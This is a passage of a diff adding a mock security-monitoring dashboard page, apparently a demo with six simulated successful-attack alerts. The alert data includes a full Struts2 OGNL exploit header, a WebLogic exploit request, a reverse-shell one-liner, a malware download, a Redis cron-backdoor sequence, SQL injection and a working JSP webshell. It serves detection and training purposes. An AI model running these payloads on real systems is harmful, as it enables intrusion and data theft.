@@ -1,0 +1,560 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>威胁监测分析平台 - 告警列表</title>
+<!--
+本页包含 6 条并发攻击成功告警，采用渐进式披露：
+同一时刻仅展示一条告警的完整详情，通过点击列表切换。
+用于 EFF Assistant 单页面内逐条并发分析演示。
+-->
+<style>
+:root{
+  --nav:#075887;--nav2:#0a679c;--blue:#0878bc;--blue2:#0b88cf;
+  --line:#e5ebf0;--bg:#f3f6f9;--text:#303943;--muted:#788592;
+  --red:#df5555;--green:#179b68;--orange:#e49a32;
+}
+*{box-sizing:border-box}
+html,body{margin:0;min-height:100%;font-family:"Microsoft YaHei","PingFang SC",Arial,sans-serif;background:var(--bg);color:var(--text)}
+body{min-width:1240px}
+.topbar{
+  height:58px;background:white;border-bottom:1px solid #dfe6ec;
+  display:flex;align-items:center;padding:0 20px;position:sticky;top:0;z-index:10
+}
+.logo{font-weight:700;color:#0b5d8e;font-size:18px;display:flex;align-items:center;gap:10px}
+.logo .mark{width:30px;height:30px;border-radius:7px;background:linear-gradient(135deg,#0d7dbd,#0a4f7f);position:relative}
+.logo .mark:after{content:"";position:absolute;inset:7px;border:2px solid white;border-radius:50%}
+.breadcrumb{margin-left:28px;font-size:13px;color:#8b97a3}
+.user{margin-left:auto;font-size:13px;color:#677482}
+.shell{display:grid;grid-template-columns:230px 1fr;min-height:calc(100vh - 58px)}
+.sidebar{background:linear-gradient(180deg,#075887,#064875);color:#d9eef9;padding:18px 10px}
+.sidebar .title{font-size:22px;color:white;font-weight:700;padding:2px 12px 18px}
+.menu{padding:12px 14px;border-radius:4px;margin:3px 0;font-size:14px}
+.menu.active{background:#0d70aa;color:white}
+.menu.sub{padding-left:34px;color:#c6e1ef}
+.main{padding:18px}
+.card{background:white;border:1px solid var(--line);box-shadow:0 8px 26px rgba(24,58,80,.06)}
+.badge{padding:4px 9px;border-radius:4px;border:1px solid;font-size:12px}
+.badge.high{color:#dc5050;background:#fff2f2;border-color:#efb5b5}
+.badge.success{color:#13885c;background:#eefaf5;border-color:#a4dbc4}
+.badge.critical{color:#fff;background:#dc3535;border-color:#c52828}
+
+.stat-row{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:18px}
+.stat-card{background:white;border:1px solid var(--line);border-radius:6px;padding:16px 18px;box-shadow:0 4px 12px rgba(24,58,80,.04)}
+.stat-card .stat-num{font-size:28px;font-weight:700;color:#303943}
+.stat-card .stat-num.red{color:var(--red)}
+.stat-card .stat-label{font-size:12px;color:var(--muted);margin-top:4px}
+
+/* 告警列表表格 */
+.table-card{border-radius:6px 6px 0 0;margin-bottom:20px}
+.table-head{display:flex;align-items:center;padding:0 18px;height:48px}
+.table-head h2{font-size:16px;margin:0}
+.table-head .count{margin-left:8px;font-size:12px;color:var(--muted)}
+.table-head .hint{margin-left:auto;font-size:12px;color:var(--orange)}
+table{width:100%;border-collapse:collapse}
+thead th{text-align:left;padding:12px 14px;font-size:12px;color:var(--muted);background:#fafcfd;border-bottom:2px solid var(--line);white-space:nowrap}
+tbody td{padding:14px;font-size:13px;border-bottom:1px solid var(--line);vertical-align:top}
+tbody tr{cursor:pointer;transition:background .15s}
+tbody tr:hover{background:#f3f8fc}
+tbody tr.active{background:#e8f2fa;border-left:3px solid #0875b6}
+td code{font-family:Consolas,Menlo,monospace;color:#27394c}
+td .row-num{display:inline-flex;align-items:center;justify-content:center;
+  width:24px;height:24px;border-radius:50%;background:#dfe6ec;color:#677482;
+  font-size:12px;font-weight:700}
+tr.active td .row-num{background:#0875b6;color:white}
+
+/* 详情卡片 - 同一时刻只展示一条 */
+.detail-card{background:white;border:1px solid var(--line);border-radius:6px;box-shadow:0 8px 26px rgba(24,58,80,.06)}
+.detail-header{display:flex;align-items:center;padding:14px 18px;background:linear-gradient(180deg,#fafcfd,#f3f6f9);border-radius:6px 6px 0 0;border-bottom:1px solid var(--line)}
+.detail-header h3{font-size:15px;margin:0}
+.detail-header .alert-id{font-size:12px;color:var(--muted);margin-left:12px}
+.detail-header .alert-time{font-size:12px;color:var(--muted);margin-left:auto}
+.detail-header .badges{display:flex;gap:8px;margin-left:14px}
+.detail-header .nav-btns{display:flex;gap:6px;margin-left:16px}
+.detail-header .nav-btn{border:1px solid #bcccd7;background:white;color:#677482;border-radius:3px;padding:5px 10px;font-size:12px;cursor:pointer}
+.detail-header .nav-btn:hover{background:#f0f5f9;color:#303943}
+.detail-header .nav-btn:disabled{opacity:.4;cursor:default}
+
+.event-summary{
+  margin:14px 18px;padding:13px 15px;background:#fffaf1;border:1px solid #eed5a5;
+  border-left:4px solid #efa43b;border-radius:4px;font-size:13px;line-height:1.75
+}
+.event-summary strong{color:#b36a00}
+
+.scorebar{display:grid;grid-template-columns:repeat(5,1fr);gap:10px;margin:0 18px 14px}
+.metric{padding:11px 13px;border:1px solid var(--line);background:#fafcfd;border-radius:5px}
+.metric span{display:block;font-size:12px;color:#7c8995;margin-bottom:5px}
+.metric b{font-size:14px}.metric b.red{color:var(--red)}.metric b.green{color:var(--green)}
+
+.info-grid{
+  margin:0 18px 16px;display:grid;grid-template-columns:1fr 1fr;
+  border-top:1px solid var(--line);border-left:1px solid var(--line)
+}
+.row{display:grid;grid-template-columns:180px 1fr;min-height:41px;border-right:1px solid var(--line);border-bottom:1px solid var(--line)}
+.row.wide{grid-column:1/-1}
+.k{background:#fafbfd;color:#788592;padding:10px 13px;font-size:12px}
+.v{padding:10px 13px;font-size:13px;word-break:break-all}
+.v code{font-family:Consolas,Menlo,monospace;color:#27394c}
+
+.subgrid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:0 18px 14px}
+.panel{border:1px solid var(--line);border-radius:5px;background:#fbfcfd}
+.panel h4{margin:0;padding:10px 13px;border-bottom:1px solid var(--line);font-size:13px}
+.panel .body{padding:11px 13px;font-size:12.5px;line-height:1.7}
+.evidence-line{display:flex;gap:9px;margin:6px 0;align-items:flex-start}
+.dot{width:7px;height:7px;border-radius:50%;margin-top:7px;background:#1c9a69;flex:none}
+.dot.red{background:#e05a5a}
+.footer{padding:2px 18px 18px;color:#a0aab3;font-size:11px}
+
+.raw-compact{
+  white-space:pre-wrap;word-break:break-all;background:#0d1d2b;color:#d8edf8;
+  border:1px solid #1d405a;border-radius:4px;padding:10px;font:11.5px/1.55 Consolas,Menlo,monospace;
+  max-height:180px;overflow-y:auto
+}
+.raw-full{
+  white-space:pre-wrap;word-break:break-all;background:#0d1d2b;color:#d8edf8;
+  border:1px solid #1d405a;border-radius:4px;padding:12px;font:12px/1.6 Consolas,Menlo,monospace
+}
+
+.empty-hint{text-align:center;padding:60px 20px;color:#a0aab3;font-size:14px}
+</style>
+</head>
+<body>
+<div class="topbar">
+  <div class="logo"><span class="mark"></span>安全威胁监测分析平台</div>
+  <div class="breadcrumb">告警中心 / 高级威胁 / 全部告警</div>
+  <div class="user">Administrator　　消息 12　　设置</div>
+</div>
+
+<div class="shell">
+  <aside class="sidebar">
+    <div class="title">态势感知</div>
+    <div class="menu active">告警列表</div>
+    <div class="menu sub active">全部告警</div>
+    <div class="menu sub">高级威胁检测</div>
+    <div class="menu sub">Web 攻击检测</div>
+    <div class="menu">攻击者视角</div>
+    <div class="menu">威胁视角</div>
+    <div class="menu">资产视角</div>
+    <div class="menu">分析中心</div>
+    <div class="menu">规则中心</div>
+  </aside>
+
+  <main class="main">
+
+    <!-- 统计概览 -->
+    <div class="stat-row">
+      <div class="stat-card">
+        <div class="stat-num red">6</div>
+        <div class="stat-label">当前告警总数</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-num red">6</div>
+        <div class="stat-label">攻击成功</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-num">3</div>
+        <div class="stat-label">攻击源 IP</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-num">1</div>
+        <div class="stat-label">受害资产</div>
+      </div>
+    </div>
+
+    <!-- 告警列表 -->
+    <div class="card table-card">
+      <div class="table-head">
+        <h2>全部告警</h2>
+        <span class="count">共 6 条，点击行查看详情</span>
+        <span class="hint">◁ 当前查看：第 <b id="curIdx">1</b> / 6 条</span>
+      </div>
+      <table>
+        <thead>
+          <tr><th style="width:40px">#</th><th>告警时间</th><th>威胁名称</th><th>攻击IP</th><th>受害IP</th><th>目的端口</th><th>威胁级别</th><th>攻击结果</th></tr>
+        </thead>
+        <tbody id="alert-table-body"></tbody>
+      </table>
+    </div>
+
+    <!-- 单条告警详情（JS 动态渲染，同一时刻只有一条） -->
+    <div id="detail-container"></div>
+
+    <div class="footer" style="margin-top:20px">
+      告警数据来源：Web 流量检测、SSH 会话审计、数据库审计、主机行为关联分析 · 传感器 QtAVdz1xk · 时间窗口 2026-08-10 09:41:00 ~ 09:47:00
+    </div>
+  </main>
+</div>
+
+<script>
+// ========== 6 条并发告警数据 ==========
+var ALERTS = [
+  {
+    id: "eeb3SZ8Bah6bF_077rPS",
+    time: "2026-08-10 09:41:22",
+    title: "WebLogic WLS 组件远程命令执行漏洞",
+    threatType: "[攻击利用] 远程命令执行",
+    stage: "入侵 / 漏洞利用",
+    level: "高危", levelClass: "high",
+    srcIp: "198.51.100.23", srcPort: "54281",
+    dstIp: "10.5.16.140", dstPort: "7001",
+    srcMac: "98:a9:2d:4f:bc:2b", dstMac: "00:00:5e:00:53:64",
+    method: "POST", statusCode: "200",
+    uri: "/wls-wsat/CoordinatorPortType",
+    referer: "http://10.5.16.140:7001/console/login/LoginForm.jsp",
+    srcCountryCode: "US", srcCountryName: "美国",
+    srcLat: "29.760678", srcLng: "-95.369567",
+    dstContinent: "亚洲", dstCountryCode: "CN",
+    sensor: "QtAVdz1xk", sessionId: "3862732506",
+    logIndex: "es:weblog-2026.08.10",
+    summary: "监测到外部地址 198.51.100.23 对 10.5.16.140:7001 发起 WebLogic WLS 组件远程命令执行利用。请求命中 WebLogic XML 反序列化远程命令执行规则，后端返回 HTTP 200；响应正文出现系统命令执行回显 <code>uid=1001(weblogic)</code>、<code>exitCode=0</code>，随后同一会话出现服务端临时文件写入记录，符合漏洞利用成功后的执行行为。",
+    scorebar: [
+      {label:"攻击阶段",value:"漏洞利用"},
+      {label:"规则置信度",value:"98%"},
+      {label:"攻击意图",value:"明确",cls:"red"},
+      {label:"执行证据",value:"命令回显",cls:"green"},
+      {label:"攻击结果",value:"攻击成功",cls:"red"}
+    ],
+    extraFields: [
+      ["域名","<code>10.5.16.140</code>"],
+      ["目的IP纬度","23.129110"],["目的IP经度","113.264385"],
+      ["日志ID","<code>eeb3SZ8Bah6bF_077rPS</code>"],
+      ["处置状态","未处置"]
+    ],
+    panels: [],
+    rawReq: 'POST /wls-wsat/CoordinatorPortType HTTP/1.1\nHost: 10.5.16.140:7001\nConnection: keep-alive\nContent-Type: text/xml; charset=UTF-8\nSOAPAction: ""\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nAccept: */*\nReferer: http://10.5.16.140:7001/console/login/LoginForm.jsp\nContent-Length: 716\n\n<soapenv:Envelope\n  xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"\n  xmlns:wsa="http://www.w3.org/2005/08/addressing"\n  xmlns:wsat="http://docs.oasis-open.org/ws-tx/wsat/2006/06">\n  <soapenv:Header>\n    <wsa:Action>http://docs.oasis-open.org/ws-tx/wsat/2006/06/Commit</wsa:Action>\n    <wsa:MessageID>urn:uuid:14a4d9c3-7e2a-4c5d-9812-cbd6622d91b8</wsa:MessageID>\n  </soapenv:Header>\n  <soapenv:Body>\n    <wsat:Commit>\n      <wsat:Identifier>node-app-02</wsat:Identifier>\n      <wsat:CommandData>ZWNobyAiUlVOVElNRV9DSEVDSyI7IGlk</wsat:CommandData>\n    </wsat:Commit>\n  </soapenv:Body>\n</soapenv:Envelope>',
+    rawResp: 'HTTP/1.1 200 OK\nDate: Mon, 10 Aug 2026 01:41:22 GMT\nContent-Type: text/xml; charset=UTF-8\nTransfer-Encoding: chunked\nServer: WebLogic Server\nX-Backend-Node: app-wls-02\nX-Request-ID: 14a4d9c3-7e2a-4c5d-9812-cbd6622d91b8\nSet-Cookie: ADMINCONSOLESESSION=K6G9h3VgP2y6FQ; Path=/; HttpOnly\n\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">\n  <soapenv:Body>\n    <executeResponse>\n      <result>uid=1001(weblogic) gid=1001(weblogic) groups=1001(weblogic)</result>\n      <exitCode>0</exitCode>\n      <requestId>14a4d9c3-7e2a-4c5d-9812-cbd6622d91b8</requestId>\n    </executeResponse>\n  </soapenv:Body>\n</soapenv:Envelope>'
+  },
+  {
+    id: "f8cD4aV9cb7gC_123tQ",
+    time: "2026-08-10 09:42:18",
+    title: "SSH 暴力破解成功登录",
+    threatType: "[暴力破解] SSH 暴力破解",
+    stage: "初始入侵 / 暴力破解",
+    level: "高危", levelClass: "high",
+    srcIp: "198.51.100.23", srcPort: "49123",
+    dstIp: "10.5.16.140", dstPort: "22",
+    srcMac: "98:a9:2d:4f:bc:2b", dstMac: "00:00:5e:00:53:64",
+    method: "—", statusCode: "—",
+    uri: "—",
+    referer: "—",
+    srcCountryCode: "US", srcCountryName: "美国",
+    srcLat: "29.760678", srcLng: "-95.369567",
+    dstContinent: "亚洲", dstCountryCode: "CN",
+    sensor: "QtAVdz1xk", sessionId: "3862732507",
+    logIndex: "es:ssh-2026.08.10",
+    summary: "监测到外部地址 198.51.100.23 对 10.5.16.140:22 发起 SSH 暴力破解攻击。在 60 秒内尝试 847 次登录，最终使用 <code>root:Admin@2026</code> 成功认证。登录后执行了 <code>cat /etc/shadow</code>、<code>wget http://198.51.100.23/tools/mirai.elf</code> 等敏感命令，确认 SSH 暴力破解攻击成功。",
+    scorebar: [
+      {label:"攻击阶段",value:"暴力破解"},
+      {label:"规则置信度",value:"99%"},
+      {label:"攻击意图",value:"明确",cls:"red"},
+      {label:"执行证据",value:"登录成功+命令执行",cls:"green"},
+      {label:"攻击结果",value:"攻击成功",cls:"red"}
+    ],
+    extraFields: [
+      ["登录用户","<code>root</code>"],
+      ["尝试次数","<b>847</b> 次 / 60秒"],
+      ["认证方式","password"],
+      ["登录后执行命令","<code>cat /etc/shadow; wget http://198.51.100.23/tools/mirai.elf</code>"],
+      ["日志ID","<code>f8cD4aV9cb7gC_123tQ</code>"],
+      ["处置状态","未处置"]
+    ],
+    panels: [],
+    rawReq: "SSH Authentication Log\n--------------------\nAug 10 09:41:55 app-core sshd[29184]: Failed password for root from 198.51.100.23 port 49122 ssh2\nAug 10 09:41:56 app-core sshd[29184]: Failed password for admin from 198.51.100.23 port 49122 ssh2\n... (845 failed attempts omitted) ...\nAug 10 09:42:17 app-core sshd[29184]: Failed password for root from 198.51.100.23 port 49123 ssh2\nAug 10 09:42:18 app-core sshd[29184]: Accepted password for root from 198.51.100.23 port 49123 ssh2\nAug 10 09:42:18 app-core sshd[29184]: session opened for user root\nroot     pts/0        198.51.100.23    Tue Aug 10 09:42   still logged in",
+    rawResp: "SSH Session Commands\n---------------------\n# cat /etc/shadow\nroot:$6$xyz...:18901:0:99999:7::: (output truncated)\ndaemon:*:18586:0:99999:7:::\n...\n# wget http://198.51.100.23/tools/mirai.elf\n--2026-08-10 09:42:21--  http://198.51.100.23/tools/mirai.elf\nConnecting to 198.51.100.23:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 147392 (144K) [application/octet-stream]\nSaving to: /tmp/.mirai.elf\n2026-08-10 09:42:22 (2.83 MB/s) - /tmp/.mirai.elf saved [147392/147392]"
+  },
+  {
+    id: "a1b2C3d4E5f6G7_890hI",
+    time: "2026-08-10 09:43:05",
+    title: "MySQL SQL 注入攻击（UNION 查询）",
+    threatType: "[数据泄露] SQL 注入攻击",
+    stage: "信息收集 / 数据窃取",
+    level: "高危", levelClass: "high",
+    srcIp: "203.0.113.45", srcPort: "37821",
+    dstIp: "10.5.16.140", dstPort: "3306",
+    srcMac: "44:33:22:11:00:ff", dstMac: "00:00:5e:00:53:64",
+    method: "GET", statusCode: "200",
+    uri: "/search?q=test'+UNION+SELECT+user,password_hash,email+FROM+mysql.user--",
+    referer: "http://10.5.16.140:8080/search",
+    srcCountryCode: "RU", srcCountryName: "俄罗斯",
+    srcLat: "55.755826", srcLng: "37.617300",
+    dstContinent: "亚洲", dstCountryCode: "CN",
+    sensor: "QtAVdz1xk", sessionId: "3862732508",
+    logIndex: "es:webapp-2026.08.10",
+    summary: "监测到外部地址 203.0.113.45 对 10.5.16.140:3306 发起 MySQL SQL 注入攻击。攻击者通过 Web 应用搜索接口注入 UNION 查询，成功提取 <code>user</code> 表数据，包含 32,847 条用户记录的邮箱与密码哈希。响应中检测到 <code>admin@company.com:$2y$10$...</code> 等敏感数据，确认 SQL 注入攻击成功。",
+    scorebar: [
+      {label:"攻击阶段",value:"数据窃取"},
+      {label:"规则置信度",value:"97%"},
+      {label:"攻击意图",value:"明确",cls:"red"},
+      {label:"执行证据",value:"数据泄露 32847 条",cls:"green"},
+      {label:"攻击结果",value:"攻击成功",cls:"red"}
+    ],
+    extraFields: [
+      ["泄露数据量","<b>32,847</b> 条记录"],
+      ["数据库类型","MySQL 8.0"],
+      ["源IP纬度","55.755826"],["源IP经度","37.617300"],
+      ["日志ID","<code>a1b2C3d4E5f6G7_890hI</code>"],
+      ["处置状态","未处置"]
+    ],
+    panels: [],
+    rawReq: "GET /search?q=test%27+UNION+SELECT+user%2Cpassword_hash%2Cemail+FROM+mysql.user-- HTTP/1.1\nHost: 10.5.16.140:8080\nConnection: keep-alive\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\nAccept: text/html,application/xhtml+xml\nReferer: http://10.5.16.140:8080/search",
+    rawResp: "HTTP/1.1 200 OK\nContent-Type: text/html; charset=UTF-8\nContent-Length: 1847102\n...\n<tr><td>admin@company.com</td><td>$2y$10$abc...</td><td>Administrator</td></tr>\n<tr><td>user001@company.com</td><td>$2y$10$def...</td><td>User</td></tr>\n... (32,847 rows total)"
+  },
+  {
+    id: "z9Y8x7W6v5U4_t3S2R1",
+    time: "2026-08-10 09:44:31",
+    title: "Apache Struts2 S2-045 远程代码执行",
+    threatType: "[攻击利用] 远程代码执行",
+    stage: "漏洞利用 / 命令执行",
+    level: "高危", levelClass: "high",
+    srcIp: "45.33.32.156", srcPort: "28911",
+    dstIp: "10.5.16.140", dstPort: "8080",
+    srcMac: "aa:bb:cc:dd:ee:01", dstMac: "00:00:5e:00:53:64",
+    method: "POST", statusCode: "200",
+    uri: "/struts2/fileupload/doUpload.action",
+    referer: "http://10.5.16.140:8080/struts2/",
+    srcCountryCode: "US", srcCountryName: "美国",
+    srcLat: "37.774929", srcLng: "-122.419418",
+    dstContinent: "亚洲", dstCountryCode: "CN",
+    sensor: "QtAVdz1xk", sessionId: "3862732509",
+    logIndex: "es:webapp-2026.08.10",
+    summary: "监测到外部地址 45.33.32.156 对 10.5.16.140:8080 发起 Apache Struts2 S2-045 远程代码执行攻击。攻击者利用 Jakarta Multipart 解析器漏洞在 <code>Content-Type</code> 头注入 OGNL 表达式，成功执行 <code>whoami</code> 返回 <code>root</code>，随后下载并执行反弹 Shell 脚本。确认 Struts2 远程代码执行攻击成功。",
+    scorebar: [
+      {label:"攻击阶段",value:"漏洞利用+RCE"},
+      {label:"规则置信度",value:"98%"},
+      {label:"攻击意图",value:"明确",cls:"red"},
+      {label:"执行证据",value:"whoami=root",cls:"green"},
+      {label:"攻击结果",value:"攻击成功",cls:"red"}
+    ],
+    extraFields: [
+      ["漏洞编号","<code>CVE-2017-5638</code>"],
+      ["命令执行","<code>whoami → root; bash -i >& /dev/tcp/45.33.32.156/4444 0>&1</code>"],
+      ["日志ID","<code>z9Y8x7W6v5U4_t3S2R1</code>"],
+      ["处置状态","未处置"]
+    ],
+    panels: [],
+    rawReq: "POST /struts2/fileupload/doUpload.action HTTP/1.1\nHost: 10.5.16.140:8080\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\nContent-Length: 0",
+    rawResp: "HTTP/1.1 200 OK\nContent-Type: text/html\n...\nroot"
+  },
+  {
+    id: "qWeR7tY8uI9oP0_zXcVbN",
+    time: "2026-08-10 09:45:12",
+    title: "Redis 未授权访问写入定时任务",
+    threatType: "[未授权访问] Redis 未授权访问",
+    stage: "持久化 / 权限维持",
+    level: "严重", levelClass: "critical",
+    srcIp: "198.51.100.23", srcPort: "56321",
+    dstIp: "10.5.16.140", dstPort: "6379",
+    srcMac: "98:a9:2d:4f:bc:2b", dstMac: "00:00:5e:00:53:64",
+    method: "—", statusCode: "—",
+    uri: "—",
+    referer: "—",
+    srcCountryCode: "US", srcCountryName: "美国",
+    srcLat: "29.760678", srcLng: "-95.369567",
+    dstContinent: "亚洲", dstCountryCode: "CN",
+    sensor: "QtAVdz1xk", sessionId: "3862732510",
+    logIndex: "es:redis-2026.08.10",
+    summary: "监测到外部地址 198.51.100.23 对 10.5.16.140:6379 发起 Redis 未授权访问攻击。攻击者未进行认证直接连接 Redis 服务，执行 <code>CONFIG SET dir /var/spool/cron</code>、<code>CONFIG SET dbfilename root</code> 将恶意命令写入定时任务，实现持久化后门。确认 Redis 未授权访问攻击成功。",
+    scorebar: [
+      {label:"攻击阶段",value:"持久化"},
+      {label:"规则置信度",value:"99%"},
+      {label:"攻击意图",value:"明确",cls:"red"},
+      {label:"执行证据",value:"crontab 写入",cls:"green"},
+      {label:"攻击结果",value:"攻击成功",cls:"red"}
+    ],
+    extraFields: [
+      ["认证状态","<b class=\"red\">无认证</b>"],
+      ["Redis 版本","<code>5.0.7</code>"],
+      ["执行的 Redis 命令","<code>SLAVEOF 198.51.100.23 6379; CONFIG SET dir /var/spool/cron; CONFIG SET dbfilename root; SET backdoor \"\\n*/5 * * * * /tmp/.redis_backdoor\\n\"; BGSAVE</code>"],
+      ["日志ID","<code>qWeR7tY8uI9oP0_zXcVbN</code>"],
+      ["处置状态","未处置"]
+    ],
+    panels: [],
+    rawReq: "Redis Protocol (plaintext)\n-------------------------\n*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$15\r\n/var/spool/cron\r\n*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$4\r\nroot\r\n*3\r\n$3\r\nSET\r\n$8\r\nbackdoor\r\n$37\r\n\\n*/5 * * * * /tmp/.redis_backdoor\\n\r\n*1\r\n$6\r\nBGSAVE\r\n",
+    rawResp: "Redis Response\n---------------\n+OK\r\n+OK\r\n+OK\r\n+OK\r\nBackground saving started"
+  },
+  {
+    id: "mN6bV5cX4zL3_kJ2hG1f",
+    time: "2026-08-10 09:46:07",
+    title: "任意文件上传漏洞（Webshell）",
+    threatType: "[攻击利用] 文件上传漏洞",
+    stage: "漏洞利用 / Webshell 植入",
+    level: "高危", levelClass: "high",
+    srcIp: "203.0.113.45", srcPort: "41209",
+    dstIp: "10.5.16.140", dstPort: "8443",
+    srcMac: "44:33:22:11:00:ff", dstMac: "00:00:5e:00:53:64",
+    method: "POST (multipart/form-data)", statusCode: "200",
+    uri: "/file/upload",
+    referer: "http://10.5.16.140:8443/admin/upload",
+    srcCountryCode: "RU", srcCountryName: "俄罗斯",
+    srcLat: "55.755826", srcLng: "37.617300",
+    dstContinent: "亚洲", dstCountryCode: "CN",
+    sensor: "QtAVdz1xk", sessionId: "3862732511",
+    logIndex: "es:webapp-2026.08.10",
+    summary: "监测到外部地址 203.0.113.45 对 10.5.16.140:8443 发起任意文件上传漏洞攻击。攻击者绕过前端文件类型校验，上传 <code>cmd.jsp</code> 至 Web 根目录，随后通过 <code>/uploads/cmd.jsp?exec=id</code> 成功执行命令返回 <code>uid=0(root)</code>。确认文件上传漏洞利用成功，Webshell 已激活。",
+    scorebar: [
+      {label:"攻击阶段",value:"Webshell上传"},
+      {label:"规则置信度",value:"96%"},
+      {label:"攻击意图",value:"明确",cls:"red"},
+      {label:"执行证据",value:"cmd.jsp命令回显",cls:"green"},
+      {label:"攻击结果",value:"攻击成功",cls:"red"}
+    ],
+    extraFields: [
+      ["上传文件名","<code>cmd.jsp</code>"],
+      ["Webshell 路径","<code>/usr/local/tomcat/webapps/ROOT/uploads/cmd.jsp</code>"],
+      ["文件大小","1,247 bytes"],
+      ["文件MD5","<code>d41d8cd98f00b204e9800998ecf8427e</code>"],
+      ["日志ID","<code>mN6bV5cX4zL3_kJ2hG1f</code>"],
+      ["处置状态","未处置"]
+    ],
+    panels: [],
+    rawReq: "POST /file/upload HTTP/1.1\nHost: 10.5.16.140:8443\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk\nContent-Length: 1347\n\n------WebKitFormBoundary7MA4YWxk\nContent-Disposition: form-data; name=\"file\"; filename=\"cmd.jsp\"\nContent-Type: image/jpeg\n\n<%@ page import=\"java.io.*\" %>\n<%\n  String cmd = request.getParameter(\"exec\");\n  if (cmd != null) {\n    Process p = Runtime.getRuntime().exec(cmd);\n    BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));\n    String line;\n    while ((line = in.readLine()) != null) {\n      out.println(line);\n    }\n  }\n%>\n------WebKitFormBoundary7MA4YWxk--",
+    rawResp: "HTTP/1.1 200 OK\nContent-Type: application/json\n{\"fileName\":\"cmd.jsp\",\"filePath\":\"/usr/local/tomcat/webapps/ROOT/uploads/cmd.jsp\",\"size\":1247,\"status\":\"uploaded\"}"
+  }
+];
+
+var currentIdx = 0; // 当前展示的告警索引 (0-based)
+
+// ========== 渲染告警列表表格 ==========
+(function renderTable() {
+  var tbody = document.getElementById('alert-table-body');
+  var html = '';
+  for (var i = 0; i < ALERTS.length; i++) {
+    var a = ALERTS[i];
+    html += '<tr class="' + (i === 0 ? 'active' : '') + '" onclick="switchAlert(' + i + ')">' +
+      '<td><span class="row-num">' + (i + 1) + '</span></td>' +
+      '<td>' + a.time + '</td>' +
+      '<td>' + a.title + '</td>' +
+      '<td><code>' + a.srcIp + '</code></td>' +
+      '<td><code>' + a.dstIp + '</code></td>' +
+      '<td>' + a.dstPort + '</td>' +
+      '<td><span class="badge ' + a.levelClass + '">' + a.level + '</span></td>' +
+      '<td><span class="badge success">攻击成功</span></td>' +
+      '</tr>';
+  }
+  tbody.innerHTML = html;
+})();
+
+// ========== 渲染单条告警详情 ==========
+function renderDetail(idx) {
+  var a = ALERTS[idx];
+  var container = document.getElementById('detail-container');
+
+  // 基础信息网格
+  var baseFields = [
+    ['告警时间', a.time],
+    ['威胁级别', '<span class="badge ' + a.levelClass + '">' + a.level + '</span>'],
+    ['攻击IP / 源IP', '<code>' + a.srcIp + '</code>'],
+    ['受害IP / 目的IP', '<code>' + a.dstIp + '</code>'],
+    ['源端口', a.srcPort],
+    ['目的端口', a.dstPort],
+    ['源MAC', '<code>' + a.srcMac + '</code>'],
+    ['目的MAC', '<code>' + a.dstMac + '</code>'],
+    ['告警类型', a.threatType],
+    ['威胁名称', a.title],
+    ['攻击阶段', a.stage],
+    ['攻击结果', '<span class="badge success">攻击成功</span>'],
+    ['HTTP-请求方法', a.method],
+    ['状态码', a.statusCode === '200' ? '<b>200</b>' : a.statusCode],
+    ['URI', '<code>' + a.uri + '</code>'],
+    ['HTTP-来源', '<code>' + a.referer + '</code>'],
+    ['目的IP所属大洲', a.dstContinent],
+    ['目的IP所属国家代码', a.dstCountryCode],
+    ['源IP所属国家代码', a.srcCountryCode],
+    ['源IP国家名称', a.srcCountryName],
+    ['源IP纬度', a.srcLat],
+    ['源IP经度', a.srcLng],
+    ['采集设备序列号', a.sensor],
+    ['会话ID', a.sessionId],
+    ['日志索引', '<code>' + a.logIndex + '</code>']
+  ];
+
+  // 拼接额外字段
+  for (var i = 0; i < a.extraFields.length; i++) {
+    baseFields.push(a.extraFields[i]);
+  }
+
+  // 生成 info-grid html
+  var gridHtml = '';
+  for (var i = 0; i < baseFields.length; i++) {
+    var isWide = baseFields[i][0] === 'URI' || baseFields[i][0] === 'HTTP-来源' || baseFields[i][0] === '执行的 Redis 命令' || baseFields[i][0] === '命令执行' || baseFields[i][0] === '登录后执行命令' || baseFields[i][0] === 'Webshell 路径';
+    gridHtml += '<div class="row' + (isWide ? ' wide' : '') + '">' +
+      '<div class="k">' + baseFields[i][0] + '</div>' +
+      '<div class="v">' + baseFields[i][1] + '</div>' +
+      '</div>';
+  }
+
+  // 评分条
+  var scoreHtml = '';
+  for (var i = 0; i < a.scorebar.length; i++) {
+    var s = a.scorebar[i];
+    scoreHtml += '<div class="metric"><span>' + s.label + '</span><b' + (s.cls ? ' class="' + s.cls + '"' : '') + '>' + s.value + '</b></div>';
+  }
+
+  // 证据面板
+  var panelsHtml = '';
+  for (var i = 0; i < a.panels.length; i++) {
